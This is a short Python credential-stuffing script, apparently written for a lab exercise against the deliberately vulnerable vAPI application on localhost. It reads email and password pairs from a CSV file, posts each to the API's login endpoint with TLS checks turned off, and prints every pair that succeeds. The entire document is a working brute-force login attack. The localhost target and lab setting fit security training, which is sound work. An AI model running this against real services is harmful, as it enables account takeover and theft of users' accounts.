import requests

vapiUrl = 'http://127.0.0.1/vapi/api2/user/login'
headers = {'Content-Type': 'application/json'}
# uncomment the line below and fix the IP:Port if using proxy
proxy = None #{"http": "http://127.0.0.1:8080","https": "https://127.0.0.1:8080"}

with open('creds.csv','r') as creds:
    for cred in creds:
        email = cred.split(',')[0]
        password = cred.split(',')[1].strip()
        data = {
            "email": email,
            "password": password
        }
        resp = requests.post(url=vapiUrl,headers=headers,json=data,proxies=proxy,verify=False)
        if resp.status_code == 200:
            print(f'Credential found: {email}:{password}')

